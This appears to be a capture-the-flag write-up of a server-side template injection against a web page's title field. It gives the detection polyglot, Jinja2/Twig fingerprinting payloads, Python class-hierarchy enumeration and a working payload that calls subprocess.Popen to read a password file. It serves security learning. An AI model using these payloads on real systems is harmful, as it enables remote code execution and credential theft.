
--------

After utilizing this polyglot: `${{<%[%'"}}%\.` we identified insecure input handling and potential SSTI.

After testing both inputs, the title input for the webpage seems to be the only one vulnerable using the payload `{{7*7}}`

The payload: `{{7*'7'}}` then shows us its either `Jinja2` or `Twig`

We then use the payload: `{{self.__init__.__globals__.__str__()}}`. To print all the names of the methods modules.

We also use the python MRO to find methods in the module: `global_name.__class__.__mro__`

Helpful Website in designing payloads: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

We used the `__subclasses__()` method to print subclasses of the main method, which includes `subprocess.Popen()`. We got the index of the `subprocess.Popen()` in the `__subclasses__()` directory, via `tr ',' '\n' < ssti.txt | wc -l`. This gave us 414 but indexed at 0 is 413.

We then called the command `{{''.__class__.__mro__[1].__subclasses__()[413](['cat .passwd'], shell=True, stdout=-1).communicate()}}`. This command referenced the base class, then the Resolution order to get the first method, then the subclasses of that method. Then reference the `Popen()` method and passed `(['cat .passwd'], shell=Ture, stdout=-1).communicate()` to execute the function correctly and return the shell command results